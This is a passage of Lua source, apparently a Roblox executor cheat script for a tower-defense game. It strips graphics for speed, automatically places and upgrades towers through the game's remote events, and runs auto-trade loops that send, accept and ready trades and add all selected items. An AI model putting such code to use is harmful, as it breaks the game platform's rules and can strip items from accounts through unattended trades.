                                        obj.Volume = 0
                                    end
                                elseif obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
                                    obj.Enabled = false
                                    obj:Destroy()
                                end
                            end)
                        end
                    end
                end
                
                local camera = workspace.CurrentCamera
                if camera then
                    for _, effect in pairs(camera:GetChildren()) do
                        pcall(function()
                            if effect:IsA("BlurEffect") or effect:IsA("ColorCorrectionEffect") then
                                effect.Enabled = false
                            end
                        end)
                    end
                end
            end)
        end
    end)
end

if not isInLobby then
    task.spawn(function()
        while true do
            task.wait(15)
            
            pcall(function()
                collectgarbage("collect")
                collectgarbage("collect") 
            end)
            
            if getgenv().FPSBoostEnabled then
                pcall(function()
                    local lighting = game:GetService("Lighting")
                    for _, child in ipairs(lighting:GetChildren()) do
                        pcall(function()
                            if not child:IsA("Sky") and not child:IsA("Atmosphere") then
                                child:Destroy()
                            end
                        end)
                    end
                    lighting.Ambient = Color3.new(1, 1, 1)
                    lighting.Brightness = 1
                    lighting.GlobalShadows = false
                    lighting.FogEnd = 100000
                    lighting.FogStart = 100000
                    lighting.ClockTime = 12
                    lighting.GeographicLatitude = 0
                    
                    local descendants = game.Workspace:GetDescendants()
                    local batchSize = 100
                    for i = 1, #descendants, batchSize do
                        for j = i, math.min(i + batchSize - 1, #descendants) do
                            local obj = descendants[j]
                            pcall(function()
                                if not obj or not obj.Parent then return end
                                
                                if obj:IsA("BasePart") then
                                    if obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("WedgePart") or obj:IsA("CornerWedgePart") then
                                        pcall(function() obj.Material = Enum.Material.SmoothPlastic end)
                                        pcall(function() obj.CastShadow = false end)
                                        if obj:FindFirstChildOfClass("Texture") then
                                            for _, t in ipairs(obj:GetChildren()) do
                                                if t:IsA("Texture") then
                                                    pcall(function() t:Destroy() end)
                                                end
                                            end
                                        end
                                        if obj:IsA("MeshPart") then
                                            pcall(function() obj.TextureID = "" end)
                                        end
                                    end
                                    if obj:IsA("Decal") then
                                        pcall(function() obj:Destroy() end)
                                    end
                                end
                                if obj:IsA("SurfaceAppearance") then
                                    pcall(function() obj:Destroy() end)
                                end
                                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
                                    pcall(function() obj.Enabled = false end)
                                end
                                if obj:IsA("Sound") then
                                    pcall(function() 
                                        obj.Volume = 0
                                        obj:Stop()
                                    end)
                                end
                            end)
                        end
                        task.wait()
                    end
                    
                    local mapPath = game.Workspace:FindFirstChild("Map") and game.Workspace.Map:FindFirstChild("Map")
                    if mapPath then
                        for _, ch in ipairs(mapPath:GetChildren()) do
                            if not ch:IsA("Model") then
                                pcall(function() ch:Destroy() end)
                            end
                        end
                    end
                end)
            end
        end
    end)
end

if not isInLobby then
    task.spawn(function()
        while true do
            task.wait(30) 
            pcall(function()
                collectgarbage("collect")
            end)
        end
    end)
    
    task.spawn(function()
        local placedTowers = {}
        local hologramParts = {}
        
        local function getClientData()
            local ok, data = pcall(function()
                return require(RS:WaitForChild("Modules"):WaitForChild("ClientData"))
            end)
            return ok and data or nil
        end
        
        local function getTowerInfo(unitName)
            local ok, data = pcall(function()
                local towerInfoPath = RS:WaitForChild("Modules"):WaitForChild("TowerInfo")
                local towerModule = towerInfoPath:FindFirstChild(unitName)
                if towerModule and towerModule:IsA("ModuleScript") then
                    return require(towerModule)
                end
            end)
            return ok and data or nil
        end
        
        local function isFarmUnit(unitName)
            local towerInfo = getTowerInfo(unitName)
            if not towerInfo or not towerInfo[1] then return false end
            return towerInfo[1].Attack == "Cash"
        end
        
        local function getWaypoints()
            local waypoints = {}
            local waypointsFolder = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Waypoints")
            if not waypointsFolder then return waypoints end
            
            for _, wp in pairs(waypointsFolder:GetChildren()) do
                if wp:IsA("BasePart") then
                    local num = tonumber(wp.Name)
                    if num and num >= 1 then
                        table.insert(waypoints, {number = num, part = wp})
                    end
                end
            end
            
            table.sort(waypoints, function(a, b) return a.number < b.number end)
            return waypoints
        end
        
        local function isValidPlacement(position)
            local rayParams = RaycastParams.new()
            rayParams.FilterType = Enum.RaycastFilterType.Blacklist
            local filterList = {}
            if workspace:FindFirstChild("Towers") then table.insert(filterList, workspace.Towers) end
            if workspace:FindFirstChild("Enemies") then table.insert(filterList, workspace.Enemies) end
            rayParams.FilterDescendantsInstances = filterList
            
            local rayOrigin = position + Vector3.new(0, 10, 0)
            local rayResult = workspace:Raycast(rayOrigin, Vector3.new(0, -20, 0), rayParams)
            
            if not rayResult then return false end
            
            local hitPart = rayResult.Instance
            if not hitPart then return false end
            
            local partName = hitPart.Name:lower()
            if partName:find("waypoint") or partName:find("path") or partName:find("rock") then
                return false
            end
            
            if hitPart.Parent and (hitPart.Parent.Name == "Waypoints" or hitPart.Parent.Name:lower():find("path")) then
                return false
            end
            
            return true
        end
        
        local function getPlacementPosition(slotNum, waypointIndex, distance)
            if getgenv().AutoPlayConfig.autoPlaceAtPosition then
                local customPos = getgenv().AutoPlayConfig.unitPositions[slotNum]
                if customPos then
                    return CFrame.new(customPos)
                end
            end
            
            local waypoints = getWaypoints()
            if #waypoints == 0 then return nil end
            
            local baseIndex = math.floor(waypointIndex)
            local decimal = waypointIndex - baseIndex
            
            baseIndex = math.clamp(baseIndex, 1, #waypoints)
            local waypoint1 = waypoints[baseIndex].part
            
            if not waypoint1 or not waypoint1.Position then return nil end
            
            local waypointPos = waypoint1.Position
            
            if decimal > 0 and baseIndex < #waypoints then
                local waypoint2 = waypoints[baseIndex + 1].part
                if waypoint2 and waypoint2.Position then
                    waypointPos = waypoint1.Position:Lerp(waypoint2.Position, decimal)
                end
            end
            
            if distance == 0 then distance = 10 end
            
            local baseAngle = slotNum * 60
            
            for attempt = 1, 15 do
                local angleVariation = math.random(-20, 20)
                local angle = math.rad(baseAngle + angleVariation)
                
                local distVariation = distance + math.random(-3, 5)
                
                local offset = Vector3.new(
                    math.cos(angle) * distVariation,
                    0,
                    math.sin(angle) * distVariation
                )
                
                local pos = waypointPos + offset
                local cframe = CFrame.new(pos.X, waypointPos.Y, pos.Z)
                
                if isValidPlacement(cframe.Position) then
                    return cframe
                end
            end
            
            local fallbackAngle = math.rad(baseAngle)
            local fallbackOffset = Vector3.new(
                math.cos(fallbackAngle) * (distance + 5),
                0,
                math.sin(fallbackAngle) * (distance + 5)
            )
            local fallbackPos = waypointPos + fallbackOffset
            return CFrame.new(fallbackPos.X, waypointPos.Y, fallbackPos.Z)
        end
        
        local function createHologram(unitName, cframe, slotNum)
            if not getgenv().AutoPlayConfig.hologram then return end
            
            local position = cframe.Position
            
            local part = Instance.new("Part")
            part.Size = Vector3.new(0.5, 0.5, 0.5)
            part.Position = position + Vector3.new(0, 2, 0)
            part.Anchored = true
            part.CanCollide = false
            part.Transparency = 0.5
            part.Color = Color3.fromRGB(0, 255, 100)
            part.Material = Enum.Material.Neon
            part.Shape = Enum.PartType.Ball
            part.Parent = workspace
            
            local beam = Instance.new("Part")
            beam.Size = Vector3.new(0.2, 4, 0.2)
            beam.Position = position
            beam.Anchored = true
            beam.CanCollide = false
            beam.Transparency = 0.6
            beam.Color = Color3.fromRGB(0, 255, 100)
            beam.Material = Enum.Material.Neon
            beam.Parent = workspace
            
            local billboard = Instance.new("BillboardGui")
            billboard.Size = UDim2.new(0, 120, 0, 30)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = part
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 0.3
            label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            label.Text = unitName .. " (Slot " .. slotNum .. ")"
            label.TextColor3 = Color3.fromRGB(0, 255, 100)
            label.TextScaled = true
            label.Font = Enum.Font.GothamBold
            label.Parent = billboard
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 4)
            corner.Parent = label
            
            table.insert(hologramParts, part)
            table.insert(hologramParts, beam)
            return part
        end
        
        local function clearHolograms()
            for _, part in pairs(hologramParts) do
                pcall(function()
                    if part and part.Parent then
                        part:Destroy()
                    end
                end)
            end
            table.clear(hologramParts)
            hologramParts = {}
        end
        
        local function getPlacedTowerCount(slotNum)
            local clientData = getClientData()
            if not clientData or not clientData.Slots then return 0 end
            
            local sortedSlots = {"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}
            local slotData = clientData.Slots[sortedSlots[slotNum]]
            if not slotData or not slotData.Value then return 0 end
            
            local unitName = slotData.Value
            local unitNameEZA = getEZATowerName(unitName)
            
            local towersFolder = workspace:FindFirstChild("Towers")
            if not towersFolder then return 0 end
            
            local count = 0
            for _, tower in pairs(towersFolder:GetChildren()) do
                if tower.Name == unitName or tower.Name == unitNameEZA then
                    local owner = tower:FindFirstChild("Owner")
                    if owner and owner.Value == Players.LocalPlayer then
                        count = count + 1
                    end
                end
            end
            
            return count
        end
        
        local function getPlacementLimit(unitName)
            local towersFolder = workspace:FindFirstChild("Towers")
            if not towersFolder then return nil end
            
            local unitNameEZA = getEZATowerName(unitName)
            
            local towerModel = towersFolder:FindFirstChild(unitNameEZA)
            if not towerModel then
                towerModel = towersFolder:FindFirstChild(unitName)
            end
            
            if not towerModel then return nil end
            
            local placementLimit = towerModel:FindFirstChild("PlacementLimit")
            if placementLimit and placementLimit:IsA("ValueBase") then
                return placementLimit.Value
            end
            
            return nil
        end
        
        local function placeTower(unitName, cframe, slotNum)
            if not cframe then return false end
            
            local placeEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("PlaceTower")
            if not placeEvent then return false end
            
            local countBefore = getPlacedTowerCount(slotNum)
            
            local success, result = pcall(function()
                return placeEvent:FireServer(unitName, cframe)
            end)
            
            if not success then return false end
            
            task.wait(0.5)
            
            local countAfter = getPlacedTowerCount(slotNum)
            if countAfter > countBefore then return true end
            
            return false
        end
        
        local function upgradeTower(tower)
            if not tower then return false end
            
            local upgradeEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Upgrade")
            if not upgradeEvent then return false end
            
            local success, result = pcall(function()
                return upgradeEvent:InvokeServer(tower)
            end)
            
            if not success then return false end
            
            return true
        end
        
        local function getTowerLevel(tower)
            if not tower then return 0 end
            local level = 0
            pcall(function()
                local upgradeValue = tower:FindFirstChild("Upgrade")
                if upgradeValue then
                    level = upgradeValue.Value or 0
                end
            end)
            return level
        end
        
        local function hologramLoop()
            task.wait(3)
            
            while true do
                task.wait(2)  
                
                if not getgenv().AutoPlayConfig.hologram then
                    clearHolograms()
                    task.wait(1)
                    continue
                end
                
                clearHolograms()
                
                local clientData = getClientData()
                if not clientData or not clientData.Slots then continue end
                
                local pathIndex = getgenv().AutoPlayConfig.pathPercentage or 1
                local distance = math.floor(getgenv().AutoPlayConfig.distanceFromPath or 10)
                
                local sortedSlots = {"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}
                local totalHolograms = 0
                local maxHolograms = 30 
                
                for slotNum = 1, 6 do
                    if totalHolograms >= maxHolograms then break end
                    
                    local slotData = clientData.Slots[sortedSlots[slotNum]]
                    if slotData and slotData.Value then
                        local unitName = slotData.Value
                        local placeCap = math.floor(getgenv().AutoPlayConfig.placeCaps[slotNum] or 1)
                        local currentCount = getPlacedTowerCount(slotNum)
                        
                        if placeCap > 0 then
                            for i = currentCount + 1, math.min(placeCap, currentCount + 10) do  
                                if totalHolograms >= maxHolograms then break end
                                
                                local position = getPlacementPosition(slotNum, pathIndex, distance)
                                if position then
                                    createHologram(unitName, position, slotNum)
                                    totalHolograms = totalHolograms + 1
                                end
                            end
                        end
                    end
                end
                
                pcall(function() collectgarbage("collect") end)
            end
        end
        
        local function autoPlaceLoop()
            task.wait(1)
            
            while true do
                task.wait(1)
                
                if getgenv()._checkIfInLobby() then
                    task.wait(2)
                    continue
                end
                
                if not getgenv().AutoPlayConfig.autoPlace and not getgenv().AutoPlayConfig.autoPlaceAtPosition then
                    task.wait(1)
                    continue
                end
                
                local clientData = getClientData()
                if not clientData or not clientData.Slots then continue end
                
                local currentCash = tonumber(getgenv().MacroCurrentCash) or 0
                
                local pathIndex = getgenv().AutoPlayConfig.pathPercentage or 1
                local distance = math.floor(getgenv().AutoPlayConfig.distanceFromPath or 10)
                
                local unitsToPlace = {}
                local sortedSlots = {"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}
                
                for slotNum = 1, 6 do
                    local slotData = clientData.Slots[sortedSlots[slotNum]]
                    if slotData and slotData.Value and slotData.Value ~= "" then
                        local unitName = slotData.Value
                        local placeCap = math.floor(getgenv().AutoPlayConfig.placeCaps[slotNum] or 1)
                        local currentCount = getPlacedTowerCount(slotNum)
                        
                        
                        if placeCap > 0 and currentCount < placeCap then
                            local cost = getgenv().GetPlaceCost and getgenv().GetPlaceCost(unitName) or 0
                            local isFarm = isFarmUnit(unitName)
                            
                            if getgenv().DebugMode then
                                print(string.format("[Auto Place] Adding %s to queue (Cost: %d, IsFarm: %s)", unitName, cost, tostring(isFarm)))
                            end
                            
                            table.insert(unitsToPlace, {
                                slotNum = slotNum,
                                unitName = unitName,
                                cost = cost,
                                isFarm = isFarm
                            })
                        end
                    end
                end
                
                if getgenv().AutoPlayConfig.focusFarm then
                    table.sort(unitsToPlace, function(a, b)
                        if a.isFarm ~= b.isFarm then
                            return a.isFarm 
                        end
                        return a.slotNum < b.slotNum
                    end)
                else
                    table.sort(unitsToPlace, function(a, b)
                        return a.slotNum < b.slotNum
                    end)
                end
                
                for _, unitData in ipairs(unitsToPlace) do
                    currentCash = tonumber(getgenv().MacroCurrentCash) or 0
                    
                    if currentCash >= unitData.cost then
                        local position = getPlacementPosition(unitData.slotNum, pathIndex, distance)
                        if position then
                            if getgenv().DebugMode then
                                print(string.format("[Auto Place] Attempting to place %s (Slot %d) at position", unitData.unitName, unitData.slotNum))
                            end
                            if placeTower(unitData.unitName, position, unitData.slotNum) then
                                if getgenv().DebugMode then
                                    print(string.format("[Auto Place] ✅ Successfully placed %s", unitData.unitName))
                                end
                                task.wait(1)
                                break 
                            else
                                if getgenv().DebugMode then
                                    print(string.format("[Auto Place] ❌ Failed to place %s", unitData.unitName))
                                end
                            end
                        else
                            if getgenv().DebugMode then
                                print(string.format("[Auto Place] ❌ No valid position for %s (Slot %d)", unitData.unitName, unitData.slotNum))
                            end
                        end
                    end
                end
            end
        end
        
        local function autoUpgradeLoop()
            task.wait(2)
            
            while true do
                task.wait(1)
                
                if getgenv()._checkIfInLobby() then
                    task.wait(2)
                    continue
                end
                
                if not getgenv().AutoPlayConfig.autoUpgrade and not getgenv().AutoPlayConfig.autoUpgradePriority then 
                    continue 
                end
                
                
                local clientData = getClientData()
                if not clientData or not clientData.Slots then 
                    continue 
                end
                
                if getgenv().AutoPlayConfig.placeBeforeUpgrade and (getgenv().AutoPlayConfig.autoPlace or getgenv().AutoPlayConfig.autoPlaceAtPosition) then
                    local allUnitsPlaced = true
                    local sortedSlots = {"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}
                    
                    for slotNum = 1, 6 do
                        local slotData = clientData.Slots[sortedSlots[slotNum]]
                        if slotData and slotData.Value and slotData.Value ~= "" then
                            local placeCap = math.floor(getgenv().AutoPlayConfig.placeCaps[slotNum] or 0)
                            local currentCount = getPlacedTowerCount(slotNum)
                            local placementLimit = getPlacementLimit(slotData.Value)
                            
                            local effectiveCap = placeCap
                            if placementLimit and placementLimit > 0 then
                                effectiveCap = math.min(placeCap, placementLimit)
                            end
                            
                            
                            if placeCap > 0 and currentCount < effectiveCap then
                                allUnitsPlaced = false
                                break
                            end
                        end
                    end
                    
                    if not allUnitsPlaced then
                        continue
                    end
                end
                
                local towersFolder = workspace:FindFirstChild("Towers")
                if not towersFolder then continue end
                
                local farmUnits = {}
                local normalUnits = {}
                
                local slotUpgradeCaps = {}
                local slotPriorities = {}
                local unitToSlot = {}
                local sortedSlots = {"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}
                for slotNum = 1, 6 do
                    local slotData = clientData.Slots[sortedSlots[slotNum]]
                    if slotData and slotData.Value then
                        local unitName = slotData.Value
                        local unitNameEZA = getEZATowerName(unitName)
                        local upgradeCap = math.floor(getgenv().AutoPlayConfig.upgradeCaps[slotNum] or 0)
                        
                        slotUpgradeCaps[unitName] = upgradeCap
                        slotUpgradeCaps[unitNameEZA] = upgradeCap
                        
                        slotPriorities[unitName] = getgenv().AutoPlayConfig.upgradePriorities[slotNum] or slotNum
                        slotPriorities[unitNameEZA] = getgenv().AutoPlayConfig.upgradePriorities[slotNum] or slotNum
                        
                        unitToSlot[unitName] = slotNum
                        unitToSlot[unitNameEZA] = slotNum
                    end
                end
                
                for _, tower in pairs(towersFolder:GetChildren()) do
                    local owner = tower:FindFirstChild("Owner")
                    if owner and owner.Value == Players.LocalPlayer then
                        local unitName = tower.Name
                        local level = getTowerLevel(tower)
                        local maxUpgrade = tower:FindFirstChild("MaxUpgrade")
                        local actualMaxLevel = maxUpgrade and maxUpgrade.Value or 20
                        
                        local upgradeCap = slotUpgradeCaps[unitName] or 20 
                        
                        if slotUpgradeCaps[unitName] and slotUpgradeCaps[unitName] == 0 then
                            continue
                        end
                        
                        local effectiveCap = math.min(upgradeCap, actualMaxLevel)
                        
                        if level < effectiveCap then
                            local upgradeCost = getgenv().GetUpgradeCost and getgenv().GetUpgradeCost(unitName, level) or 999999999
                            local priority = slotPriorities[unitName] or 999
                            
                            if isFarmUnit(unitName) then
                                table.insert(farmUnits, {tower = tower, level = level, cap = effectiveCap, unitName = unitName, cost = upgradeCost, priority = priority})
                            else
                                table.insert(normalUnits, {tower = tower, level = level, cap = effectiveCap, unitName = unitName, cost = upgradeCost, priority = priority})
                            end
                        end
                    end
                end
                
                if getgenv().AutoPlayConfig.autoUpgradePriority then
                    table.sort(farmUnits, function(a, b)
                        if a.priority ~= b.priority then
                            return a.priority < b.priority
                        end
                        return a.cost < b.cost
                    end)
                    table.sort(normalUnits, function(a, b)
                        if a.priority ~= b.priority then
                            return a.priority < b.priority
                        end
                        return a.cost < b.cost
                    end)
                else
                    table.sort(farmUnits, function(a, b) return a.cost < b.cost end)
                    table.sort(normalUnits, function(a, b) return a.cost < b.cost end)
                end
                
                local currentCash = tonumber(getgenv().MacroCurrentCash) or 0
                
                local upgraded = false
                
                local allUnits = {}
                for _, data in ipairs(farmUnits) do
                    data.isFarm = true
                    table.insert(allUnits, data)
                end
                for _, data in ipairs(normalUnits) do
                    data.isFarm = false
                    table.insert(allUnits, data)
                end
                
                
                if getgenv().AutoPlayConfig.autoUpgradePriority then
                    table.sort(allUnits, function(a, b)
                        if getgenv().AutoPlayConfig.focusFarm then
                            if a.isFarm ~= b.isFarm then
                                return a.isFarm
                            end
                        end
                        
                        if a.priority ~= b.priority then
                            return a.priority < b.priority
                        end
                        
                        return a.cost < b.cost
                    end)
                else
                    table.sort(allUnits, function(a, b) return a.cost < b.cost end)
                end
                
                if getgenv().AutoPlayConfig.autoUpgradePriority then
                    for _, data in ipairs(allUnits) do
                        if upgraded then break end
                        
                        currentCash = tonumber(getgenv().MacroCurrentCash) or 0
                        
                        
                        if data.cost > 0 and currentCash >= data.cost then
                            local prefix = data.isFarm and "[FARM] " or ""
                            if upgradeTower(data.tower) then
                                upgraded = true
                                task.wait(0.2)

                            end
                        end
                    end
                else
                    for _, data in ipairs(allUnits) do
                        if upgraded then break end
                        currentCash = tonumber(getgenv().MacroCurrentCash) or 0
                        
                        
                        if data.cost > 0 and currentCash >= data.cost then
                            if upgradeTower(data.tower) then
                                upgraded = true
                                task.wait(0.2)

                            end
                       
                        end
                    end
                end
            end
        end
        
        task.spawn(hologramLoop)
        task.spawn(autoPlaceLoop)
        task.spawn(autoUpgradeLoop)
    end)
end

getgenv()._ButtonPressActive = false
getgenv().SelectionSanitizerEnabled = getgenv().SelectionSanitizerEnabled ~= false

task.spawn(function()
    local GuiService = game:GetService("GuiService")
    local lastScan = tick()
    while task.wait(0.2) do
        pcall(function()
            if getgenv()._checkIfInLobby() then return end
            if not getgenv().SelectionSanitizerEnabled then return end

            local gameStarted = true
            pcall(function()
                local gs = RS:FindFirstChild("GameStarted")
                if gs and gs.Value ~= nil then
                    gameStarted = gs.Value
                end
            end)
            if not gameStarted then return end

            local selected = GuiService.SelectedObject
            if selected then
                local now = tick()
                local shouldClear = false
                if not getgenv()._ButtonPressActive then
                    if (now - lastScan) > 0.6 then
                        local nameLower = selected.Name:lower()
                        if not nameLower:find("tooltip") and not nameLower:find("hover") then
                            shouldClear = true
                        end
                    end
                end
                if shouldClear then
                    GuiService.SelectedObject = nil
                end
            end
            lastScan = tick()
        end)
    end
end)

do
    task.spawn(function()
        local lastTradeSentTime = 0
        local tradeRequestCooldown = 5
        
        while true do
            task.wait(1)
            
            if getgenv().AutoTradePlayerEnabled and getgenv().AutoTradeTargetPlayer then
                local targetUsername = getgenv().AutoTradeTargetPlayer:match("@([^)]+)%)")
                if targetUsername and targetUsername ~= "No other players" then
                    local targetPlayer = Players:FindFirstChild(targetUsername)
                    
                    if targetPlayer and targetPlayer ~= LocalPlayer then
                        local currentTime = tick()
                        if (currentTime - lastTradeSentTime) >= tradeRequestCooldown then
                            pcall(function()
                                local tradeRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Trade") and RS.Remotes.Trade:FindFirstChild("Invite")
                                if tradeRemote then
                                    tradeRemote:FireServer("Send", targetPlayer)
                                    lastTradeSentTime = currentTime
                                end
                            end)
                        end
                    end
                end
            end
        end
    end)
    
    task.spawn(function()
        local lastPromptCheck = nil
        
        while true do
            task.wait(0.5)
            
            if getgenv().AutoAcceptTradeEnabled and getgenv().AutoAcceptTradeFromPlayers then
                pcall(function()
                    local tradeInvite = LocalPlayer.PlayerGui:FindFirstChild("Trade_Invite")
                    if tradeInvite then
                        local main = tradeInvite:FindFirstChild("Main")
                        if main then
                            local prompt = main:FindFirstChild("Prompt")
                            if prompt then
                                local bg = prompt:FindFirstChild("BG")
                                if bg then
                                    local title = bg:FindFirstChild("Title")
                                    if title and title.Text then
                                        local nameFromUI = title.Text:match("Trade request From @(.+)")
                                        if nameFromUI then
                                            local traderPlayer = nil
                                            for _, player in ipairs(Players:GetPlayers()) do
                                                if player.DisplayName == nameFromUI or player.Name == nameFromUI then
                                                    traderPlayer = player
                                                    break
                                                end
                                            end
                                            
                                            if traderPlayer then
                                                local shouldAccept = false
                                                if type(getgenv().AutoAcceptTradeFromPlayers) == "table" then
                                                    local count = 0
                                                    for _ in pairs(getgenv().AutoAcceptTradeFromPlayers) do count = count + 1 end
                                                    for i, acceptPlayer in pairs(getgenv().AutoAcceptTradeFromPlayers) do
                                                        if type(acceptPlayer) == "string" then
                                                            local acceptUsername = acceptPlayer:match("@([^)]+)%)")
                                                            if not acceptUsername then
                                                                acceptUsername = acceptPlayer
                                                            end
                                                            if acceptUsername and (traderPlayer.Name == acceptUsername or traderPlayer.DisplayName == acceptUsername or acceptPlayer == traderPlayer.DisplayName .. " (@" .. traderPlayer.Name .. ")") then
                                                                shouldAccept = true
                                                                break
                                                            end
                                                        elseif type(acceptPlayer) == "boolean" and acceptPlayer == true then
                                                            local playerKey = tostring(i)
                                                            local keyUsername = playerKey:match("@([^)]+)%)")
                                                            if not keyUsername then
                                                                keyUsername = playerKey
                                                            end
                                                            if keyUsername and (traderPlayer.Name == keyUsername or traderPlayer.DisplayName == keyUsername or playerKey == traderPlayer.DisplayName .. " (@" .. traderPlayer.Name .. ")") then
                                                                shouldAccept = true
                                                                break
                                                            end
                                                        end
                                                    end
                                                end
                                                
                                                if shouldAccept then
                                                    local tradeRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Trade") and RS.Remotes.Trade:FindFirstChild("Invite")
                                                    if tradeRemote then
                                                        tradeRemote:FireServer("Accept")
                                                        task.wait(0.5)
                                                        
                                                        getgenv()._PendingTradeAdd = true
                                                    end
                                                else
                                                    local tradeRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Trade") and RS.Remotes.Trade:FindFirstChild("Invite")
                                                    if tradeRemote then
                                                        tradeRemote:FireServer("Decline")
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end)
    
    task.spawn(function()
        while true do
            task.wait(0.5)
            
            if getgenv().AutoTradeItems and type(getgenv().AutoTradeItems) == "table" then
                pcall(function()
                    local tradeMain = RS:FindFirstChild("TradeMain")
                    if tradeMain then
                        local present = {}
                        getgenv()._TradeItemsAdded = getgenv()._TradeItemsAdded or {}
                        getgenv()._PendingTradeAdd = getgenv()._PendingTradeAdd or false
                        for _, tf in ipairs(tradeMain:GetChildren()) do
                            if tf:IsA("Folder") then
                                present[tf.Name] = true
                                local p2 = tf:FindFirstChild("Player2UserID")
                                local participant = (tf.Name == tostring(LocalPlayer.UserId)) or (p2 and tostring(p2.Value) == tostring(LocalPlayer.UserId))
                                if participant and not getgenv()._TradeItemsAdded[tf.Name] then
                                    local itemsAdded = tf:FindFirstChild("ItemsAdded")
                                    local canAddNow = false
                                    if itemsAdded and itemsAdded.Value == "[]" then
                                        canAddNow = true
                                    elseif getgenv()._PendingTradeAdd then
                                        canAddNow = true
                                    end
                                    if canAddNow then
                                        local clientData = getgenv().GetClientData and getgenv().GetClientData()
                                        if clientData and clientData.ItemData then
                                            local normalized = {}
                                            for k,v in pairs(getgenv().AutoTradeItems) do
                                                if type(k) == "string" and v == true then
                                                    table.insert(normalized, k)
                                                elseif type(v) == "string" then
                                                    table.insert(normalized, v)
                                                end
                                            end
                                            for _, itemName in ipairs(normalized) do
                                                local itemInfo = clientData.ItemData[itemName]
                                                if itemInfo and itemInfo.Amount and itemInfo.Amount > 0 then
                                                    local itemAddRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Trade") and RS.Remotes.Trade:FindFirstChild("ItemAdd")
                                                    if itemAddRemote then
                                                        itemAddRemote:FireServer(itemName, itemInfo.Amount)
                                                        task.wait(0.05)
                                                    end
                                                end
                                            end
                                            getgenv()._TradeItemsAdded[tf.Name] = true
                                            getgenv()._PendingTradeAdd = false
                                        end
                                    end
                                end
                            end
                        end
                        for k,_ in pairs(getgenv()._TradeItemsAdded) do
                            if not present[k] then
                                getgenv()._TradeItemsAdded[k] = nil
                            end
                        end
                    end
                end)
            end
        end
    end)
    
    task.spawn(function()
        while true do
            task.wait(0.3)
            
            if getgenv().AutoReadyTradeEnabled then
                pcall(function()
                    local tradeMain = RS:FindFirstChild("TradeMain")
                    if tradeMain then
                        for _, tradeFolder in ipairs(tradeMain:GetChildren()) do
                            if tradeFolder and tradeFolder:IsA("Folder") then
                                local isParticipant = false
                                local localId = tostring(LocalPlayer.UserId)
                                if tradeFolder.Name == localId then
                                    isParticipant = true
                                else
                                    local p2 = tradeFolder:FindFirstChild("Player2UserID")
                                    if p2 and tostring(p2.Value) == localId then
                                        isParticipant = true
                                    end
                                end
                                if isParticipant then
                                    local playersReady = tradeFolder:FindFirstChild("PlayersReady")
                                    if playersReady then
                                        local raw = playersReady.Value
                                        local alreadyReady = false
                                        if raw ~= "[]" then
                                            for id in string.gmatch(raw, "(%d+)") do
                                                if id == localId then
                                                    alreadyReady = true
                                                    break
                                                end
                                            end
                                        end

                                        local itemsAddedFlag = getgenv()._TradeItemsAdded and getgenv()._TradeItemsAdded[tradeFolder.Name]
                                        local itemsAddedObj = tradeFolder:FindFirstChild("ItemsAdded")
                                        local itemsAddedNonEmpty = itemsAddedObj and itemsAddedObj.Value and itemsAddedObj.Value ~= "[]"

                                        local hasSelections = false
                                        do
                                            local sel = getgenv().AutoTradeItems
                                            if type(sel) == "table" then
                                                for k,v in pairs(sel) do
                                                    if (type(k) == "string" and v == true) or type(v) == "string" then
                                                        hasSelections = true
                                                        break
                                                    end
                                                end
                                            end
                                        end

                                        local canReady = (not alreadyReady) and (itemsAddedFlag or itemsAddedNonEmpty or (not hasSelections))
                                        if canReady then
                                            getgenv()._TradeReadyCooldown = getgenv()._TradeReadyCooldown or {}
                                            local now = os.clock()
                                            local last = getgenv()._TradeReadyCooldown[tradeFolder.Name] or 0
                                            if now - last > 2 then
                                                local managerRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Trade") and RS.Remotes.Trade:FindFirstChild("Manager")
                                                if managerRemote then
                                                    managerRemote:FireServer("Ready")
                                                    getgenv()._TradeReadyCooldown[tradeFolder.Name] = now
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end)
end
end

getgenv()._InitializeGameSystems()
